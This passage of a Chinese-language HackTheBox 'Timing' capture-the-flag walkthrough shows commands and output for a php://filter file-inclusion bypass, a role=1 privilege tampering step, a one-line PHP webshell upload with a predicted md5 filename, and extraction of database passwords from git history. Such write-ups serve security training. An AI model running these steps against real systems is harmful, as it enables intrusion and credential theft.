Words: 3, Lines: 1]\n/usr/local/apache/error.log [Status: 200, Size: 25, Words: 3, Lines: 1]\n/var/apache/logs/error_log [Status: 200, Size: 25, Words: 3, Lines: 1]\n/usr/local/cpanel/logs/access_log [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/at.deny            [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/motd               [Status: 200, Size: 25, Words: 3, Lines: 1]\n/var/log/auth.log       [Status: 200, Size: 25, Words: 3, Lines: 1]\n/var/log/httpd/error.log [Status: 200, Size: 25, Words: 3, Lines: 1]\n/var/log/kern.log       [Status: 200, Size: 25, Words: 3, Lines: 1]\n/var/log/lighttpd/error.log [Status: 200, Size: 25, Words: 3, Lines: 1]\n/var/log/lighttpd/lighttpd.access.log [Status: 200, Size: 25, Words: 3, Lines: 1]\n/var/log/httpd/access.log [Status: 200, Size: 25, Words: 3, Lines: 1]\n/var/log/httpd/access_log [Status: 200, Size: 25, Words: 3, Lines: 1]\n/var/log/httpd/error_log [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/php.ini            [Status: 200, Size: 25, Words: 3, Lines: 1]\n/var/log/maillog        [Status: 200, Size: 25, Words: 3, Lines: 1]\n/usr/local/php/httpd.conf [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/bootptab           [Status: 200, Size: 25, Words: 3, Lines: 1]\n/var/log/httpsd/ssl.access_log [Status: 200, Size: 25, Words: 3, Lines: 1]\n/var/log/exim_paniclog  [Status: 200, Size: 25, Words: 3, Lines: 1]\n/var/log/ftp-proxy      [Status: 200, Size: 25, Words: 3, Lines: 1]\n/var/log/apache2/error_log [Status: 200, Size: 25, Words: 3, Lines: 1]\n/var/log/mysql.log      [Status: 200, Size: 25, Words: 3, Lines: 1]\n/var/log/httpsd/ssl_log [Status: 200, Size: 25, Words: 3, Lines: 1]\n/var/log/mysql/mysql-bin.log [Status: 200, Size: 25, Words: 3, Lines: 1]\n/var/log/mysql/mysql-slow.log [Status: 200, Size: 25, Words: 3, Lines: 1]\n/usr/local/etc/httpd/logs/access_log [Status: 200, Size: 25, Words: 3, Lines: 1]\n/var/log/pureftpd.log   [Status: 200, Size: 25, Words: 3, Lines: 1]\n/var/log/lighttpd/lighttpd.error.log [Status: 200, Size: 25, Words: 3, Lines: 1]\n/var/log/vsftpd.log     [Status: 200, Size: 25, Words: 3, Lines: 1]\n/var/log/dmesg          [Status: 200, Size: 25, Words: 3, Lines: 1]\n/proc/self/net/arp      [Status: 200, Size: 25, Words: 3, Lines: 1]\n/var/log/message        [Status: 200, Size: 25, Words: 3, Lines: 1]\n/var/log/xferlog        [Status: 200, Size: 25, Words: 3, Lines: 1]\n/var/log/messages       [Status: 200, Size: 25, Words: 3, Lines: 1]\n/var/log/mysqlderror.log [Status: 200, Size: 25, Words: 3, Lines: 1]\n/var/log/faillog        [Status: 200, Size: 25, Words: 3, Lines: 1]\n/var/mysql.log          [Status: 200, Size: 25, Words: 3, Lines: 1]\n/var/spool/cron/crontabs/root [Status: 200, Size: 25, Words: 3, Lines: 1]\n/var/www/log/access_log [Status: 200, Size: 25, Words: 3, Lines: 1]\n/var/www/logs/access_log [Status: 200, Size: 25, Words: 3, Lines: 1]\n/usr/local/php/lib/php.ini [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/resolv.conf        [Status: 200, Size: 25, Words: 3, Lines: 1]\n/var/log/pure-ftpd/pure-ftpd.log [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/lighttpd.conf      [Status: 200, Size: 25, Words: 3, Lines: 1]\n/var/log/exim_rejectlog [Status: 200, Size: 25, Words: 3, Lines: 1]\n/usr/local/php5/httpd.conf [Status: 200, Size: 25, Words: 3, Lines: 1]\n/var/run/utmp           [Status: 200, Size: 25, Words: 3, Lines: 1]\n/var/log/wtmp           [Status: 200, Size: 25, Words: 3, Lines: 1]\n/var/webmin/miniserv.log [Status: 200, Size: 25, Words: 3, Lines: 1]\n/var/www/logs/error_log [Status: 200, Size: 25, Words: 3, Lines: 1]\n/var/log/yum.log        [Status: 200, Size: 25, Words: 3, Lines: 1]\n/var/log/ftp-proxy/ftp-proxy.log [Status: 200, Size: 25, Words: 3, Lines: 1]\n/var/log/ftplog         [Status: 200, Size: 25, Words: 3, Lines: 1]\n/var/www/logs/error.log [Status: 200, Size: 25, Words: 3, Lines: 1]\n/var/www/logs/access.log [Status: 200, Size: 25, Words: 3, Lines: 1]\n/var/log/apache2/access_log [Status: 200, Size: 25, Words: 3, Lines: 1]\n/var/log/mail.info      [Status: 200, Size: 25, Words: 3, Lines: 1]\n/var/log/proftpd        [Status: 200, Size: 25, Words: 3, Lines: 1]\n/var/log/secure         [Status: 200, Size: 25, Words: 3, Lines: 1]\n/proc/cpuinfo           [Status: 200, Size: 25, Words: 3, Lines: 1]\n/var/log/lastlog        [Status: 200, Size: 25, Words: 3, Lines: 1]\n/var/log/chttp.log      [Status: 200, Size: 25, Words: 3, Lines: 1]\n/usr/local/apache/logs/access.log [Status: 200, Size: 25, Words: 3, Lines: 1]\n/var/log/exim/rejectlog [Status: 200, Size: 25, Words: 3, Lines: 1]\n/var/log/lighttpd/access.log [Status: 200, Size: 25, Words: 3, Lines: 1]\n/var/log/apache-ssl/access.log [Status: 200, Size: 25, Words: 3, Lines: 1]\n/etc/ssh/ssh_host_key   [Status: 200, Size: 25, Words: 3, Lines: 1]\n/usr/local/etc/httpd/logs/error_log [Status: 200, Size: 25, Words: 3, Lines: 1]\n/var/log/mail.warn      [Status: 200, Size: 25, Words: 3, Lines: 1]\n/var/log/exim_mainlog   [Status: 200, Size: 25, Words: 3, Lines: 1]\n/usr/local/php4/httpd.conf.php [Status: 200, Size: 25, Words: 3, Lines: 1]\n/var/www/log/error_log  [Status: 200, Size: 25, Words: 3, Lines: 1]\n/var/log/boot           [Status: 200, Size: 25, Words: 3, Lines: 1]\n/var/log/mail.log       [Status: 200, Size: 25, Words: 3, Lines: 1]\n/var/log/mysql/mysql.log [Status: 200, Size: 25, Words: 3, Lines: 1]\n/var/log/apache/error_log [Status: 200, Size: 25, Words: 3, Lines: 1]\n/var/apache2/config.inc [Status: 200, Size: 25, Words: 3, Lines: 1]\n:: Progress: [257/257] :: Job [1/1] :: 24 req/sec :: Duration: [0:00:25] :: Errors: 1 ::\n```\n## 漏洞利用\n这边是可以读取出来东西的，证明参数对了，去随便访问一个看看\n\n```bash\n┌──(root💀root)-[~/Desktop]\n└─# curl http://10.10.11.135/image.php?img=/etc/passwd\nHacking attempt detected!\n```\n这里似乎碰到waf了，想办法绕过一下\n\n这里找到了一篇参考文章\n\n> [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File Inclusion#wrapper-phpfilter](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion#wrapper-phpfilter)\n\n```bash\nhttp://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php\n```\n上面这一条测试后可以绕过，现在我们来构造POC\n\n```bash\n┌──(root💀root)-[~/Desktop]\n└─# curl http://10.10.11.135/image.php?img=php://filter/convert.base64-encode/resource=/etc/passwd\ncm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovdmFyL3J1bi9pcmNkOi91c3Ivc2Jpbi9ub2xvZ2luCmduYXRzOng6NDE6NDE6R25hdHMgQnVnLVJlcG9ydGluZyBTeXN0ZW0gKGFkbWluKTovdmFyL2xpYi9nbmF0czovdXNyL3NiaW4vbm9sb2dpbgpub2JvZHk6eDo2NTUzNDo2NTUzNDpub2JvZHk6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtbmV0d29yazp4OjEwMDoxMDI6c3lzdGVtZCBOZXR3b3JrIE1hbmFnZW1lbnQsLCw6L3J1bi9zeXN0ZW1kL25ldGlmOi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtcmVzb2x2ZTp4OjEwMToxMDM6c3lzdGVtZCBSZXNvbHZlciwsLDovcnVuL3N5c3RlbWQvcmVzb2x2ZTovdXNyL3NiaW4vbm9sb2dpbgpzeXNsb2c6eDoxMDI6MTA2OjovaG9tZS9zeXNsb2c6L3Vzci9zYmluL25vbG9naW4KbWVzc2FnZWJ1czp4OjEwMzoxMDc6Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgpfYXB0Ong6MTA0OjY1NTM0Ojovbm9uZXhpc3RlbnQ6L3Vzci9zYmluL25vbG9naW4KbHhkOng6MTA1OjY1NTM0OjovdmFyL2xpYi9seGQvOi9iaW4vZmFsc2UKdXVpZGQ6eDoxMDY6MTEwOjovcnVuL3V1aWRkOi91c3Ivc2Jpbi9ub2xvZ2luCmRuc21hc3E6eDoxMDc6NjU1MzQ6ZG5zbWFzcSwsLDovdmFyL2xpYi9taXNjOi91c3Ivc2Jpbi9ub2xvZ2luCmxhbmRzY2FwZTp4OjEwODoxMTI6Oi92YXIvbGliL2xhbmRzY2FwZTovdXNyL3NiaW4vbm9sb2dpbgpwb2xsaW5hdGU6eDoxMDk6MTo6L3Zhci9jYWNoZS9wb2xsaW5hdGU6L2Jpbi9mYWxzZQpzc2hkOng6MTEwOjY1NTM0OjovcnVuL3NzaGQ6L3Vzci9zYmluL25vbG9naW4KbXlzcWw6eDoxMTE6MTE0Ok15U1FMIFNlcnZlciwsLDovbm9uZXhpc3RlbnQ6L2Jpbi9mYWxzZQphYXJvbjp4OjEwMDA6MTAwMDphYXJvbjovaG9tZS9hYXJvbjovYmluL2Jhc2gK\n```\n得到了一段base64编码，咱们把POC稍微修改一下，让它解密base64\n\n```bash\n┌──(root💀root)-[~/Desktop]\n└─# curl http://10.10.11.135/image.php?img=php://filter/convert.base64-encode/resource=/etc/passwd|base64 -d  \n  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n                                 Dload  Upload   Total   Spent    Left  Speed\n100  2152  100  2152    0     0   3788      0 --:--:-- --:--:-- --:--:--  3788\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\nsystemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin\nsystemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin\nsyslog:x:102:106::/home/syslog:/usr/sbin/nologin\nmessagebus:x:103:107::/nonexistent:/usr/sbin/nologin\n_apt:x:104:65534::/nonexistent:/usr/sbin/nologin\nlxd:x:105:65534::/var/lib/lxd/:/bin/false\nuuidd:x:106:110::/run/uuidd:/usr/sbin/nologin\ndnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin\nlandscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin\npollinate:x:109:1::/var/cache/pollinate:/bin/false\nsshd:x:110:65534::/run/sshd:/usr/sbin/nologin\nmysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false\naaron:x:1000:1000:aaron:/home/aaron:/bin/bash\n```\n成功读取文件\n\n然后咱们尝试读取一下之前获取到的本地文件\n\n```php\n┌──(root💀root)-[~/Desktop]\n└─# curl http://10.10.11.135/image.php?img=php://filter/convert.base64-encode/resource=upload.php|base64 -d\n  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n                                 Dload  Upload   Total   Spent    Left  Speed\n100  1360  100  1360    0     0    624      0  0:00:02  0:00:02 --:--:--   624\n<?php\ninclude(\"admin_auth_check.php\");\n\n$upload_dir = \"images/uploads/\";\n\nif (!file_exists($upload_dir)) {\n    mkdir($upload_dir, 0777, true);\n}\n\n$file_hash = uniqid();\n\n$file_name = md5('$file_hash' . time()) . '_' . basename($_FILES[\"fileToUpload\"][\"name\"]);\n$target_file = $upload_dir . $file_name;\n$error = \"\";\n$imageFileType = strtolower(pathinfo($target_file, PATHINFO_EXTENSION));\n\nif (isset($_POST[\"submit\"])) {\n    $check = getimagesize($_FILES[\"fileToUpload\"][\"tmp_name\"]);\n    if ($check === false) {\n        $error = \"Invalid file\";\n    }\n}\n\n// Check if file already exists\nif (file_exists($target_file)) {\n    $error = \"Sorry, file already exists.\";\n}\n\nif ($imageFileType != \"jpg\") {\n    $error = \"This extension is not allowed.\";\n}\n\nif (empty($error)) {\n    if (move_uploaded_file($_FILES[\"fileToUpload\"][\"tmp_name\"], $target_file)) {\n        echo \"The file has been uploaded.\";\n    } else {\n        echo \"Error: There was an error uploading your file.\";\n    }\n} else {\n    echo \"Error: \" . $error;\n}\n?>\n```\n这边可以看到有一个认证文件admin\\_auth\\_check.php，咱们读取一下\n\n```php\n┌──(root💀root)-[~/Desktop]\n└─# curl http://10.10.11.135/image.php?img=php://filter/convert.base64-encode/resource=admin_auth_check.php|base64 -d\n  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n                                 Dload  Upload   Total   Spent    Left  Speed\n100   268  100   268    0     0    470      0 --:--:-- --:--:-- --:--:--   471\n<?php\n\ninclude_once \"auth_check.php\";\n\nif (!isset($_SESSION['role']) || $_SESSION['role'] != 1) {\n    echo \"No permission to access this panel!\";\n    header('Location: ./index.php');\n    die();\n}\n\n?>\n```\n这里可以看到，咱们要使用文件上传功能那就得有一个role1的权限，但是目前没有任何线索能得到关于role1的内容，这里把/etc/passwd内获取到的账户aaron拿去尝试一下\n\n![](Hackthebox-Timing/fc8a9d18-d119-413a-a2a2-372e7a75fe39.png)\n\n成功登录，咱们拿到了一个user2的权限，那不用想肯定是需要越权了\n\n![](Hackthebox-Timing/6d0996b9-927d-4596-a907-0bf5acc2007a.png)\n\n![](Hackthebox-Timing/8b10d4e9-4fd4-47cc-b6a6-88f2ac77fd67.png)\n\n抓了一个包看了一下，似乎没有关于role的权限，那咱们自己加一个呢？试试看\n\n![](Hackthebox-Timing/0119fa62-9817-4a3c-adf4-a9dd033cb157.png)\n\n改包加入role=1执行后，刷新一下页面\n\n![](Hackthebox-Timing/05274cd5-f029-4621-996d-a036e36c7135.png)\n\n可以看到多了一个admin panel按钮，点进去看看\n\n![](Hackthebox-Timing/f0df66af-a67d-49cc-94ab-fa09e4a7d877.png)\n\n明确多了一个上传点\n\n```php\n┌──(root💀root)-[~/Desktop]\n└─# cat shell.jpg\n<?php system($_GET[cmd]);?>\n```\n创建一个带有一句话木马的jpg文件\n\n接着把我们本地系统的时间修改为GMT(我默认的是CST)\n\n然后上传该jpg文件的时候拦截上传包，使用php -a开始执行下列循环语句以后，再放包\n\n```php\nwhile (true){echo date(\"D M j G:i:s T Y\"); echo \" = \" ; echo md5('$file_hash' .time());echo \"\\n\";sleep(1);}\n```\n```php\n┌──(root💀root)-[~/Desktop]\n└─# php -a\nInteractive mode enabled\n\nphp > while (true){echo date(\"D M j G:i:s T Y\"); echo \" = \" ; echo md5('$file_hash' .time());echo \"\\n\";sleep(1);}\nSat Jan 1 0:50:55 CST 2022 = 019996d3ee825407d56ab94dd16bdb34\nSat Jan 1 0:50:56 CST 2022 = c56f6f652fcf60605708795fe9051eeb\nSat Jan 1 0:50:57 CST 2022 = dc3e0079c26a5db5f2c5c96ec26ee917\n```\n```php\n┌──(root💀root)-[~]\n└─# curl 'http://10.10.11.135/image.php?img=images/uploads/80417f57b8c9ce57ca7efbcc1b85a9ae_shell.jpg&cmd=id'\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n```\n我把本地时间修改了后，成功getshell，咱们继续下一步\n\n这台机器有防火墙，无法直接拿到反向shell，咱们一步步来\n\n```php\n┌──(root💀root)-[~]\n└─# curl 'http://10.10.11.135/image.php?img=images/uploads/80417f57b8c9ce57ca7efbcc1b85a9ae_shell.jpg&cmd=ls+-la+/opt'\ntotal 632\ndrwxr-xr-x  2 root root   4096 Dec 31 16:49 .\ndrwxr-xr-x 24 root root   4096 Nov 29 01:34 ..\n-rw-r--r--  1 root root   5609 Dec 31 16:49 default\n-rw-r--r--  1 root root 627851 Jul 20 22:36 source-files-backup.zip\n```\n咱们把文件复制到/var/www/html/images/uploads/然后下载\n\n```php\n┌──(root💀root)-[~]\n└─# curl 'http://10.10.11.135/image.php?img=images/uploads/80417f57b8c9ce57ca7efbcc1b85a9ae_shell.jpg&cmd=cp+/opt/source-files-backup.zip+/var/www/html/images/uploads/'\n\n┌──(root💀root)-[~]\n└─# curl 'http://10.10.11.135/image.php?img=images/uploads/source-files-backup.zip' --output source-files-backup.zip                                                                                          6 ⨯\n  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n                                 Dload  Upload   Total   Spent    Left  Speed\n100  613k    0  613k    0     0   165k      0 --:--:--  0:00:03 --:--:--  165k\n```\n```php\n┌──(root💀root)-[~/Desktop/backup]\n└─# ls -la\n总用量 76\ndrwxr-xr-x  6 root root 4096  7月 20 22:34 .\ndrwxr-xr-x 12 root root 4096 12月 31 17:36 ..\n-rw-r--r--  1 root root  200  7月 20 22:34 admin_auth_check.php\n-rw-r--r--  1 root root  373  7月 20 22:34 auth_check.php\n-rw-r--r--  1 root root 1268  7月 20 22:34 avatar_uploader.php\ndrwxr-xr-x  2 root root 4096  7月 20 22:34 css\n-rw-r--r--  1 root root   92  7月 20 22:34 db_conn.php\n-rw-r--r--  1 root root 3937  7月 20 22:34 footer.php\ndrwxr-xr-x  8 root root 4096  7月 20 22:35 .git\n-rw-r--r--  1 root root 1498  7月 20 22:34 header.php\n-rw-r--r--  1 root root  507  7月 20 22:34 image.php\ndrwxr-xr-x  3 root root 4096  7月 20 22:34 images\n-rw-r--r--  1 root root  188  7月 20 22:34 index.php\ndrwxr-xr-x  2 root root 4096  7月 20 22:34 js\n-rw-r--r--  1 root root 2074  7月 20 22:34 login.php\n-rw-r--r--  1 root root  113  7月 20 22:34 logout.php\n-rw-r--r--  1 root root 3041  7月 20 22:34 profile.php\n-rw-r--r--  1 root root 1740  7月 20 22:34 profile_update.php\n-rw-r--r--  1 root root  984  7月 20 22:34 upload.php\n```\n解压后可以得到.git文件，请求git文件看看能得到什么\n\n```bash\n┌──(root💀root)-[~/Desktop/backup]\n└─# ~/Desktop/GitTools/Extractor/extractor.sh . source\n###########\n# Extractor is part of https://github.com/internetwache/GitTools\n#\n# Developed and maintained by @gehaxelt from @internetwache\n#\n# Use at your own risk. Usage might be illegal in certain circumstances. \n# Only for educational purposes!\n###########\n[*] Destination folder does not exist\n[*] Creating...\n[+] Found commit: e4e214696159a25c69812571c8214d2bf8736a3f\n[+] Found file: /root/Desktop/backup/source/0-e4e214696159a25c69812571c8214d2bf8736a3f/admin_auth_check.php\n[+] Found file: /root/Desktop/backup/source/0-e4e214696159a25c69812571c8214d2bf8736a3f/auth_check.php\n[+] Found file: /root/Desktop/backup/source/0-e4e214696159a25c69812571c8214d2bf8736a3f/avatar_uploader.php\n[+] Found folder: /root/Desktop/backup/source/0-e4e214696159a25c69812571c8214d2bf8736a3f/css\n[+] Found file: /root/Desktop/backup/source/0-e4e214696159a25c69812571c8214d2bf8736a3f/css/bootstrap.min.css\n[+] Found file: /root/Desktop/backup/source/0-e4e214696159a25c69812571c8214d2bf8736a3f/css/login.css\n[+] Found file: /root/Desktop/backup/source/0-e4e214696159a25c69812571c8214d2bf8736a3f/db_conn.php\n[+] Found file: /root/Desktop/backup/source/0-e4e214696159a25c69812571c8214d2bf8736a3f/footer.php\n[+] Found file: /root/Desktop/backup/source/0-e4e214696159a25c69812571c8214d2bf8736a3f/header.php\n[+] Found file: /root/Desktop/backup/source/0-e4e214696159a25c69812571c8214d2bf8736a3f/image.php\n[+] Found folder: /root/Desktop/backup/source/0-e4e214696159a25c69812571c8214d2bf8736a3f/images\n[+] Found file: /root/Desktop/backup/source/0-e4e214696159a25c69812571c8214d2bf8736a3f/images/background.jpg\n[+] Found file: /root/Desktop/backup/source/0-e4e214696159a25c69812571c8214d2bf8736a3f/images/user-icon.png\n[+] Found file: /root/Desktop/backup/source/0-e4e214696159a25c69812571c8214d2bf8736a3f/index.php\n[+] Found folder: /root/Desktop/backup/source/0-e4e214696159a25c69812571c8214d2bf8736a3f/js\n[+] Found file: /root/Desktop/backup/source/0-e4e214696159a25c69812571c8214d2bf8736a3f/js/avatar_uploader.js\n[+] Found file: /root/Desktop/backup/source/0-e4e214696159a25c69812571c8214d2bf8736a3f/js/bootstrap.min.js\n[+] Found file: /root/Desktop/backup/source/0-e4e214696159a25c69812571c8214d2bf8736a3f/js/jquery.min.js\n[+] Found file: /root/Desktop/backup/source/0-e4e214696159a25c69812571c8214d2bf8736a3f/js/profile.js\n[+] Found file: /root/Desktop/backup/source/0-e4e214696159a25c69812571c8214d2bf8736a3f/login.php\n[+] Found file: /root/Desktop/backup/source/0-e4e214696159a25c69812571c8214d2bf8736a3f/logout.php\n[+] Found file: /root/Desktop/backup/source/0-e4e214696159a25c69812571c8214d2bf8736a3f/profile.php\n[+] Found file: /root/Desktop/backup/source/0-e4e214696159a25c69812571c8214d2bf8736a3f/profile_update.php\n[+] Found file: /root/Desktop/backup/source/0-e4e214696159a25c69812571c8214d2bf8736a3f/upload.php\n[+] Found commit: 16de2698b5b122c93461298eab730d00273bd83e\n[+] Found file: /root/Desktop/backup/source/1-16de2698b5b122c93461298eab730d00273bd83e/admin_auth_check.php\n[+] Found file: /root/Desktop/backup/source/1-16de2698b5b122c93461298eab730d00273bd83e/auth_check.php\n[+] Found file: /root/Desktop/backup/source/1-16de2698b5b122c93461298eab730d00273bd83e/avatar_uploader.php\n[+] Found folder: /root/Desktop/backup/source/1-16de2698b5b122c93461298eab730d00273bd83e/css\n[+] Found file: /root/Desktop/backup/source/1-16de2698b5b122c93461298eab730d00273bd83e/css/bootstrap.min.css\n[+] Found file: /root/Desktop/backup/source/1-16de2698b5b122c93461298eab730d00273bd83e/css/login.css\n[+] Found file: /root/Desktop/backup/source/1-16de2698b5b122c93461298eab730d00273bd83e/db_conn.php\n[+] Found file: /root/Desktop/backup/source/1-16de2698b5b122c93461298eab730d00273bd83e/footer.php\n[+] Found file: /root/Desktop/backup/source/1-16de2698b5b122c93461298eab730d00273bd83e/header.php\n[+] Found file: /root/Desktop/backup/source/1-16de2698b5b122c93461298eab730d00273bd83e/image.php\n[+] Found folder: /root/Desktop/backup/source/1-16de2698b5b122c93461298eab730d00273bd83e/images\n[+] Found file: /root/Desktop/backup/source/1-16de2698b5b122c93461298eab730d00273bd83e/images/background.jpg\n[+] Found file: /root/Desktop/backup/source/1-16de2698b5b122c93461298eab730d00273bd83e/images/user-icon.png\n[+] Found file: /root/Desktop/backup/source/1-16de2698b5b122c93461298eab730d00273bd83e/index.php\n[+] Found folder: /root/Desktop/backup/source/1-16de2698b5b122c93461298eab730d00273bd83e/js\n[+] Found file: /root/Desktop/backup/source/1-16de2698b5b122c93461298eab730d00273bd83e/js/avatar_uploader.js\n[+] Found file: /root/Desktop/backup/source/1-16de2698b5b122c93461298eab730d00273bd83e/js/bootstrap.min.js\n[+] Found file: /root/Desktop/backup/source/1-16de2698b5b122c93461298eab730d00273bd83e/js/jquery.min.js\n[+] Found file: /root/Desktop/backup/source/1-16de2698b5b122c93461298eab730d00273bd83e/js/profile.js\n[+] Found file: /root/Desktop/backup/source/1-16de2698b5b122c93461298eab730d00273bd83e/login.php\n[+] Found file: /root/Desktop/backup/source/1-16de2698b5b122c93461298eab730d00273bd83e/logout.php\n[+] Found file: /root/Desktop/backup/source/1-16de2698b5b122c93461298eab730d00273bd83e/profile.php\n[+] Found file: /root/Desktop/backup/source/1-16de2698b5b122c93461298eab730d00273bd83e/profile_update.php\n[+] Found file: /root/Desktop/backup/source/1-16de2698b5b122c93461298eab730d00273bd83e/upload.php\n```\n然后多了一个source目录\n\n```bash\n┌──(root💀root)-[~/Desktop/backup]\n└─# ls -la\n总用量 80\ndrwxr-xr-x  7 root root 4096 12月 31 17:42 .\ndrwxr-xr-x 13 root root 4096 12月 31 17:38 ..\n-rw-r--r--  1 root root  200  7月 20 22:34 admin_auth_check.php\n-rw-r--r--  1 root root  373  7月 20 22:34 auth_check.php\n-rw-r--r--  1 root root 1268  7月 20 22:34 avatar_uploader.php\ndrwxr-xr-x  2 root root 4096  7月 20 22:34 css\n-rw-r--r--  1 root root   92  7月 20 22:34 db_conn.php\n-rw-r--r--  1 root root 3937  7月 20 22:34 footer.php\ndrwxr-xr-x  8 root root 4096  7月 20 22:35 .git\n-rw-r--r--  1 root root 1498  7月 20 22:34 header.php\n-rw-r--r--  1 root root  507  7月 20 22:34 image.php\ndrwxr-xr-x  3 root root 4096  7月 20 22:34 images\n-rw-r--r--  1 root root  188  7月 20 22:34 index.php\ndrwxr-xr-x  2 root root 4096  7月 20 22:34 js\n-rw-r--r--  1 root root 2074  7月 20 22:34 login.php\n-rw-r--r--  1 root root  113  7月 20 22:34 logout.php\n-rw-r--r--  1 root root 3041  7月 20 22:34 profile.php\n-rw-r--r--  1 root root 1740  7月 20 22:34 profile_update.php\ndrwxr-xr-x  4 root root 4096 12月 31 17:42 source\n-rw-r--r--  1 root root  984  7月 20 22:34 upload.php\n```\n```bash\n┌──(root💀root)-[~/Desktop/backup]\n└─# cd source \n\n┌──(root💀root)-[~/Desktop/backup/source]\n└─# ls -la\n总用量 16\ndrwxr-xr-x 4 root root 4096 12月 31 17:42 .\ndrwxr-xr-x 7 root root 4096 12月 31 17:42 ..\ndrwxr-xr-x 5 root root 4096 12月 31 17:42 0-e4e214696159a25c69812571c8214d2bf8736a3f\ndrwxr-xr-x 5 root root 4096 12月 31 17:42 1-16de2698b5b122c93461298eab730d00273bd83e\n```\n然后多了两个文件夹\n\n```bash\n┌──(root💀root)-[~/Desktop/backup/source]\n└─# diff 0-e4e214696159a25c69812571c8214d2bf8736a3f/ 1-16de2698b5b122c93461298eab730d00273bd83e/                                                                                                              1 ⨯\ndiff '--color=auto' 0-e4e214696159a25c69812571c8214d2bf8736a3f/commit-meta.txt 1-16de2698b5b122c93461298eab730d00273bd83e/commit-meta.txt\n1,3c1,4\n< tree fd7fb62599f9702baeb0abdc42a8a4b68e49ec23\n< author grumpy <grumpy@localhost.com> 1626820434 +0000\n< committer grumpy <grumpy@localhost.com> 1626820434 +0000\n---\n> tree dcbc181650833009145874df7da85b4c6d84b2ca\n> parent e4e214696159a25c69812571c8214d2bf8736a3f\n> author grumpy <grumpy@localhost.com> 1626820453 +0000\n> committer grumpy <grumpy@localhost.com> 1626820453 +0000\n5c6\n< init\n---\n> db_conn updated\n0-e4e214696159a25c69812571c8214d2bf8736a3f/css 和 1-16de2698b5b122c93461298eab730d00273bd83e/css 有共同的子目录\ndiff '--color=auto' 0-e4e214696159a25c69812571c8214d2bf8736a3f/db_conn.php 1-16de2698b5b122c93461298eab730d00273bd83e/db_conn.php\n2c2\n< $pdo = new PDO('mysql:host=localhost;dbname=app', 'root', 'S3cr3t_unGu3ss4bl3_p422w0Rd');\n---\n> $pdo = new PDO('mysql:host=localhost;dbname=app', 'root', '4_V3Ry_l0000n9_p422w0rd');\n0-e4e214696159a25c69812571c8214d2bf8736a3f/images 和 1-16de2698b5b122c93461298eab730d00273bd83e/images 